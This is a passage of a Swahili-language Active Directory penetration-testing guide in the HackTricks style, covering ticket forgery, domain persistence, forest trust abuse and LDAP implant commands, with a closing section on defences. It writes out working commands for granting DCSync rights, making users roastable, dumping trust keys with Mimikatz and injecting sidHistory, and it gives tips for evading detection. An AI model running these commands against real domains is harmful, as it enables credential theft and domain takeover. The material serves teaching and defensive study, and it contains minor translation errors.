- Fanya watumiaji wawe hatarini kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Fanya watumiaji wawe hatarini kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Toa ruhusa za [**DCSync**](#dcsync) kwa mtumiaji

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Shambulio la **Silver Ticket** linaunda tiketi halali ya Ticket Granting Service (TGS) kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya account ya PC**). Njia hii inatumika kupata ruhusa za huduma.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Shambulio la **Golden Ticket** linahusisha mshambuliaji kupata **NTLM hash ya account ya krbtgt** katika mazingira ya Active Directory (AD). Account hii ni maalum kwa sababu inatumika kusaini Ticket Granting Tickets (TGTs), ambazo ni muhimu kwa uthibitisho ndani ya mtandao wa AD.

Mara mshambuliaji atakapopata hash hii, anaweza kuunda **TGTs** kwa akaunti yoyote anayotaka (shambulio la Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizotengenezwa kwa njia inayoweza **kuzuia mifumo ya kawaida ya kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za akaunti au uwezo wa kuziomba** ni njia nzuri sana ya kudumu katika akaunti ya mtumiaji (hata kama anaibadilisha nywila):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Kutumia certificates pia kunawezekana kudumu ukiwa na ruhusa za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Kituo cha **AdminSDHolder** katika Active Directory kinahakikisha usalama wa **vyanzo vyenye mamlaka** (kama Domain Admins na Enterprise Admins) kwa kutumika kwa standard **Access Control List (ACL)** kwenye makundi haya ili kuzuia mabadiliko yasiyotakiwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; ikiwa mshambuliaji atabadilisha ACL ya AdminSDHolder na kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo anapata udhibiti mpana juu ya makundi yote ya wenye mamlaka. Kipengele hiki cha usalama, kilichokusudiwa kulinda, kinaweza kusababisha madhara na kuruhusu upatikanaji usiofaa isipokuwa ukifuatiliwa kwa karibu.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Kwenye kila **Domain Controller (DC)**, kuna account ya **local administrator**. Kupata haki za admin kwenye mashine kama hiyo, hash ya local Administrator inaweza kuchomwa kwa kutumia **mimikatz**. Baadaye, marekebisho ya registry ni muhimu ili **kuwezesha matumizi ya nywila hii**, kuruhusu ufikiaji wa mbali kwa account ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** mtumiaji **ruhusa maalum** juu ya vitu fulani vya domain ambazo zitamruhusu mtumiaji **kupandisha hadhi baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** zinatumika **kuhifadhi** **ruhusa** ambazo **object** ina **juu ya** kitu. Ikiwa unaweza kufanya hata **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata haki za kuvutia juu ya object hiyo bila kuwa mwanachama wa kundi lenye mamlaka.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** katika kumbukumbu ili kuanzisha **neno la siri la ulimwengu mzima**, likikupa ufikiaji kwa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** kwa **clear text** credentials zinazotumika kufikia mashine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Inasajili **Domain Controller mpya** katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwa vitu vilivyobainishwa **bila** kuacha **logs** kuhusu **mabadiliko**. Unahitaji ruhusa za DA na uwe ndani ya **root domain**.\
Kumbuka kwamba kama utatumia data zisizo sahihi, logs mbaya zitajitokeza.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Tayari tumependekeza jinsi ya kupandisha hadhi ikiwa una **uruhusa za kutosha kusoma LAPS passwords**. Hata hivyo, nywila hizi pia zinaweza kutumiwa **kudumisha persistence**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft inaona **Forest** kama mpaka wa usalama. Hii ina maana kwamba **kupata udhibiti wa domain moja kunaweza kusababisha Forest nzima kuathirika**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni mbinu ya usalama inayomruhusu mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Inaunda muunganiko kati ya mifumo ya uthibitisho ya domains mbili, ikiruhusu uhamisho wa uthibitisho kufanyika kwa urahisi. Wakati domains zinapoweka trust, zinabadilishana na kuhifadhi **vifunguo** fulani ndani ya **Domain Controllers (DCs)**, ambavyo ni muhimu kwa uaminifu wa trust.

Katika hali ya kawaida, ikiwa mtumiaji anataka kufikia huduma katika **trusted domain**, lazima kwanza aombe tiketi maalum iitwayo **inter-realm TGT** kutoka DC ya domain yake. TGT hii imefichwa kwa **funguo** ya kuaminiana ambayo domains zote mbili zimekubaliana. Mtumiaji kisha anamwonyesha TGT hiyo kwa **DC ya trusted domain** ili kupata tiketi ya huduma (**TGS**). Baada ya DC ya trusted domain kuthibitisha inter-realm TGT kwa kutumia funguo ya kuaminiana na ikiwa ni halali, itatoa **TGS**, ikimpa mtumiaji ufikiaji wa huduma.

**Hatua**:

1. Kompyuta ya **mteja** katika **Domain 1** inaanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 inatoa TGT jipya ikiwa mteja aithibitishwa kwa mafanikio.
3. Mteja kisha anaomba **inter-realm TGT** kutoka DC1, ambayo inahitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT imefichwa kwa **trust key** iliyogawanywa kati ya DC1 na DC2 kama sehemu ya trust mbili njia.
5. Mteja huchukua inter-realm TGT kwenda kwa **Domain 2's Domain Controller (DC2)**.
6. DC2 inathibitisha inter-realm TGT kwa kutumia funguo ya kuaminiana na, ikiwa ni halali, inatoa **Ticket Granting Service (TGS)** kwa server katika Domain 2 ambayo mteja anataka kufikia.
7. Mwishowe, mteja anampa server TGS hii, ambayo imefichwa kwa hash ya account ya server, ili kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya njia 1 au za njia 2**. Kwa chaguo la njia 2, domains zote mbili zinaaminiana, lakini katika uhusiano wa **1 way** moja ya domains itakuwa **trusted** na nyingine itakuwa **trusting**. Katika kesi ya mwisho, **utaweza tu kufikia rasilimali ndani ya trusting domain kutoka trusted one**.

Ikiwa Domain A inaamini Domain B, A ni trusting domain na B ni trusted. Zaidi ya hayo, katika **Domain A**, hii itakuwa **Outbound trust**; na katika **Domain B**, itakuwa **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Huu ni usanidi wa kawaida ndani ya forest moja, ambapo child domain kwa kawaida ina two-way transitive trust na parent domain yake. Hii ina maana kwamba maombi ya uthibitisho yanaweza kusafiri kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Zilizojulikana kama "shortcut trusts," hizi zinatekelezwa kati ya child domains ili kuharakisha mchakato wa referral. Katika forests tata, referrals za uthibitisho kwa kawaida zinahitaji kusafiri hadi kwenye root ya forest kisha zishuke hadi domain lengwa. Kwa kuunda cross-links, safari hiyo inafupiwa, jambo lenye manufaa hasa katika mazingira yaliyoenea kwa kijiografia.
- **External Trusts**: Hizi zinawekwa kati ya domains tofauti, zisizohusiana na mara nyingi hazipitishi (non-transitive). Kwa mujibu wa [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts zinafaa kwa kupata rasilimali katika domain nje ya forest ya sasa ambayo haishonanishwa kwa forest trust. Usalama unaongezeka kupitia SID filtering na external trusts.
- **Tree-root Trusts**: Trusts hizi zinaanzishwa moja kwa moja kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazikutambuliwi sana, tree-root trusts ni muhimu kuongeza miti mpya ya domain ndani ya forest, zikiruhusu kuwa na jina la kipekee la domain na kuhakikisha transitivity ya njia mbili. Maelezo zaidi yanaweza kupatikana katika [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni two-way transitive trust kati ya forest root domains mbili, pia ikitekeleza SID filtering ili kuongeza hatua za usalama.
- **MIT Trusts**: Trusts hizi zinaanzishwa na Kerberos domains zisizo za Windows, zinazofuata [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum kidogo na zinahudumia mazingira yanayohitaji mwingiliano na mifumo ya Kerberos yenye msingi nje ya mfumo wa Windows.

#### Other differences in **trusting relationships**

- Uhusiano wa trust pia unaweza kuwa **transitive** (A aamini B, B aamini C, basi A aamini C) au **non-transitive**.
- Uhusiano wa trust unaweza kuwekwa kama **bidirectional trust** (pande zote zinawaamini kila mmoja) au kama **one-way trust** (moja tu inaamini nyingine).

### Attack Path

1. **Orodhesha** uhusiano wa kuamini
2. Angalia kama kuna **security principal** (user/group/computer) anayekuwa na **ufikiaji** kwa rasilimali za **domain nyingine**, labda kwa kuchapishwa kwa ACE au kwa kuwa katika makundi ya domain nyingine. Tazama **uhusiano kati ya domains** (trust iliumbwa kwa sababu hii pengine).
1. kerberoast katika kesi hii inaweza kuwa chaguo jingine.
3. **Comproimise** akaunti ambazo zinaweza **ku-pivot** kupitia domains.

Wavamizi wanaoweza kupata rasilimali katika domain nyingine wanaweza kufanya hivyo kupitia njia tatu kuu:

- **Local Group Membership**: Principals wanaweza kuongezwa kwenye makundi ya ndani kwenye mashine, kama kundi la “Administrators” kwenye server, na kuzipa udhibiti mkubwa wa mashine hiyo.
- **Foreign Domain Group Membership**: Principals pia wanaweza kuwa wanachama wa makundi ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii unategemea aina ya trust na upeo wa kundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kuteuliwa ndani ya **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, wakiwapa ufikiaji kwa rasilimali maalum. Kwa wale wanaotaka kuchimba undani wa mechanics za ACLs, DACLs, na ACEs, whitepaper iitwayo “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali muhimu.

### Find external users/groups with permissions

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hizi zitakuwa user/group kutoka **domain/forest ya nje**.

Unaweza kuangalia hii kwa kutumia **Bloodhound** au powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Njia nyingine za kuorodhesha domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Kuna **funguo 2 za kuaminika**, moja kwa _Child --> Parent_ na nyingine kwa _Parent_ --> _Child_.\
> Unaweza kuona ile inayotumika na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Pandisha hadhi kama Enterprise admin kwenye domain ya child/parent kwa kutumia trust kwa SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumika ni muhimu. Configuration NC hutumika kama repositori kuu ya data za configuration katika forest katika mazingira ya Active Directory (AD). Data hii inariplicwa kwa kila Domain Controller (DC) ndani ya forest, na DC zinazoweza kuandikwa zinahifadhi nakala inayoandikwa ya Configuration NC. Ili kuchukua faida ya hili, inahitaji kuwa na **SYSTEM privileges on a DC**, ikiwezekana child DC.

**Link GPO to root DC site**

Container ya Sites ya Configuration NC ina taarifa kuhusu sites za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kufanya kazi na SYSTEM privileges kwenye DC yoyote, wawanzi wa mashambulizi wanaweza ku-link GPOs kwa root DC sites. Kitendo hiki kinaweza kuathiri root domain kwa kuharibu policies zinazotekelezwa kwa sites hizo.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Vector ya mashambulizi ni kulenga gMSA zenye haki za juu ndani ya domain. KDS Root key, muhimu kwa kuhesabu passwords za gMSAs, imehifadhiwa ndani ya Configuration NC. Kwa SYSTEM privileges kwenye DC yoyote, inawezekana kupata KDS Root key na kuhesabu passwords za gMSA yoyote katika forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Njia hii inahitaji uvumilivu, kusubiri uundaji wa vitu vipya vya AD vyenye haki za juu. Kwa SYSTEM privileges, mshambuliaji anaweza kubadilisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili wa classes zote. Hii inaweza kusababisha ufikiaji usioidhinishwa na udhibiti wa vitu vipya vya AD.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Udhuru wa ADCS ESC5 unalenga udhibiti wa vitu vya Public Key Infrastructure (PKI) ili kuunda certificate template inayowawezesha uthibitisho kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko ndani ya Configuration NC, kushambuliwa kwa writable child DC kunaruhusu utekelezaji wa mashambulizi ya ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Katika mazingira yasiyo na ADCS, mshambuliaji ana uwezo wa kuweka vipengele vinavyohitajika, kama ilivyoelezwa katika [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Katika tukio hili **domain yako imeaminiwa** na domain ya nje ikikupa **idhinishwa zisizoainishwa** juu yake. Utahitaji kubaini **ni principals gani wa domain yako wana upatikanaji gani juu ya domain ya nje** na kisha kujaribu kui-exploit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Katika tukio hili **your domain** inamwamini baadhi ya **privileges** kwa mhusika kutoka **different domains**.

Hata hivyo, wakati **domain is trusted** na domain inayomwamini, domain iliyothibitishwa **creates a user** mwenye **predictable name** ambaye anatumia kama **password the trusted password**. Hii ina maana kuwa inawezekana **access a user from the trusting domain to get inside the trusted one** ili kuirambua na kujaribu kupata privileges zaidi:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Njia nyingine ya kuathiri domain iliyothibitishwa ni kupata [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) iliyotengenezwa kwa **opposite direction** ya domain trust (hii si ya kawaida sana).

Njia nyingine ya kuathiri domain iliyothibitishwa ni kusubiri kwenye mashine ambapo **user kutoka domain iliyothibitishwa anaweza access** kuingia kupitia **RDP**. Kisha, mshambuliaji anaweza kuingiza code kwenye mchakato wa kikao cha RDP na **access the origin domain of the victim** kutoka huko. Zaidi ya hayo, ikiwa **victim mounted his hard drive**, kutoka kwa mchakato wa **RDP session** mshambuliaji anaweza kuhifadhi **backdoors** katika **startup folder of the hard drive**. Mbinu hii inaitwa **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Upunguzaji wa matumizi mabaya ya domain trust

### **SID Filtering:**

- Hatari ya mashambulizi yanayotumia sifa ya SID history kupitia inter-forest trusts inapunguzwa na SID Filtering, ambayo imewezeshwa kwa default kwenye inter-forest trusts zote. Hii inaendeshwa kwa dhana kwamba intra-forest trusts ni salama, kwa kuzingatia forest, badala ya domain, kama mpaka wa usalama kama Microsoft inavyokuwa nayo.
- Hata hivyo, kuna tatizo: SID filtering inaweza kuathiri applications na access za watumiaji, na kusababisha mara kwa mara kuzimwa kwake.

### **Selective Authentication:**

- Kwa inter-forest trusts, kutumia Selective Authentication kuhakikisha kwamba watumiaji kutoka misitu miwili hawajasajiliwa kwa njia ya moja kwa moja. Badala yake, ruhusa ya wazi inahitajika kwa watumiaji ili kufikia domains na servers ndani ya domain au forest inayomwamini.
- Ni muhimu kutambua kwamba hatua hizi hazizuii unyonyaji wa writable Configuration Naming Context (NC) au mashambulizi dhidi ya trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) inatengeneza upya bloodyAD-style LDAP primitives kama x64 Beacon Object Files zinazofanya kazi yote ndani ya on-host implant (mfano, Adaptix C2). Operators wanakusanya package kwa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, wanapakia `ldap.axs`, na kisha wanaita `ldap <subcommand>` kutoka kwa beacon. Trafiki yote inatumia current logon security context juu ya LDAP (389) na signing/sealing au LDAPS (636) na auto certificate trust, hivyo hakuna socks proxies au disk artifacts zinazohitajika.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` hurudisha short names/OU paths kuwa full DNs na kutupa objects zinazolingana.
- `get-object`, `get-attribute`, and `get-domaininfo` huvuta attributes yoyote (ikiwa ni pamoja na security descriptors) pamoja na forest/domain metadata kutoka `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` zinaonyesha roasting candidates, delegation settings, na descriptors za [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) zilizopo moja kwa moja kutoka LDAP.
- `get-acl` and `get-writable --detailed` huchambua DACL ili kuorodhesha trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), na inheritance, zikitoa malengo ya haraka kwa ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives kwa kupandisha hadhi na kudumu

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) huruhusu operatori kuweka principals wapya au akaunti za mashine mahali popote haki za OU zipo. `add-groupmember`, `set-password`, `add-attribute`, na `set-attribute` hupora malengo moja kwa moja mara tu haki za write-property zinapopatikana.
- Amri zinazolenga ACL kama `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, na `add-dcsync` zinatafsiri WriteDACL/WriteOwner kwenye kitu chochote cha AD kuwa reset za password, udhibiti wa uanachama wa group, au ruhusa za DCSync bila kuachia artifacts za PowerShell/ADSI. Vipengele vya `remove-*` vinaondoa ACE zilizowekwa.

### Delegation, roasting, na matumizi mabaya ya Kerberos

- `add-spn`/`set-spn` hufanya mtumiaji aliyevamiwa kuwa Kerberoastable mara moja; `add-asreproastable` (UAC toggle) humweka kwa AS-REP roasting bila kugusa password.
- Macros za delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) zinaandika upya `msDS-AllowedToDelegateTo`, vigezo vya UAC, au `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwenye beacon, zikiwezesha njia za kushambulia za constrained/unconstrained/RBCD na kuondoa haja ya PowerShell ya mbali au RSAT.

### kudungwa kwa sidHistory, kuhamishwa kwa OU, na kuunda uso wa mashambulizi

- `add-sidhistory` huingiza SIDs zenye mamlaka katika historia ya SID ya principal inayodhibitiwa (tazama [SID-History Injection](sid-history-injection.md)), ikitoa urithi wa upatikanaji kwa utapeli kikamilifu kupitia LDAP/LDAPS.
- `move-object` hubadili DN/OU ya kompyuta au watumiaji, ikimruhusu mshambuliaji kuvuta mali ndani ya OUs ambako haki za delegated tayari ziko kabla ya kutumia `set-password`, `add-groupmember`, au `add-spn`.
- Amri za kuondoa zenye upeo mdogo (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, n.k.) huruhusu kurejesha haraka baada ya operatori kuvuna credentials au kudumu, zikipunguza telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Mikakati ya Ulinzi ya Jumla

[**Jifunze zaidi jinsi ya kulinda credentials hapa.**](../stealing-credentials/credentials-protections.md)

### **Hatua za Ulinzi kwa ajili ya Ulinzi wa Credentials**

- **Domain Admins Restrictions**: Inashauriwa kwamba Domain Admins waruhusiwe kuingia tu kwenye Domain Controllers, wakiepuka matumizi yao kwenye host nyingine.
- **Service Account Privileges**: Services hazipaswi kukimbia kwa ruhusa za Domain Admin (DA) ili kudumisha usalama.
- **Temporal Privilege Limitation**: Kwa kazi zinazohitaji ruhusa za DA, muda wake unapaswa kuwa mdogo. Hii inaweza kufikiwa kwa: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Kagua Audit Event IDs 2889/3074/3075 kisha zima LDAP signing pamoja na LDAPS channel binding kwenye DCs/clients ili kuzuia jaribio la LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Kutekeleza Mbinu za Udanganyifu**

- Kutekeleza udanganyifu kunahusisha kuweka fitina, kama watumiaji wa kudanganya au kompyuta za kudanganya, zenye sifa kama passwords zisizokufa au zilizoweka kama Trusted for Delegation. Mbinu ya kina inajumuisha kuunda watumiaji wenye haki maalum au kuwaongeza katika makundi ya mamlaka ya juu.
- Mfano wa vitendo ni kutumia zana kama: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Zaidi juu ya kutekeleza mbinu za udanganyifu zinapatikana kwenye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Kutambua Udanganyifu**

- **Kwa Vitu vya Mtumiaji**: Viashiria vinavyoshuku vinajumuisha ObjectSID isiyo ya kawaida, kuingia kwa nadra, tarehe za kuundwa, na idadi ndogo ya makosa ya password.
- **Viashiria vya Kawaida**: Kulinganisha sifa za vitu vinavyoweza kuwa decoy na zile za vitu halisi kunaweza kufichua kutokufanana. Zana kama [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) zinaweza kusaidia kutambua udanganyifu huo.

### **Kuepuka Mifumo ya Ugunduzi**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Kuepuka enumeration ya session kwenye Domain Controllers ili kuzuia utambuzi wa ATA.
- **Ticket Impersonation**: Kutumia vikoa vya **aes** kwa uundaji wa tiketi husaidia kuepuka ugunduzi kwa kutodowngrade kuwa NTLM.
- **DCSync Attacks**: Inashauriwa kutekeleza kutoka kwenye mashine isiyo Domain Controller ili kuepuka utambuzi wa ATA, kwani utekelezaji moja kwa moja kutoka Domain Controller utasababisha taarifa.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
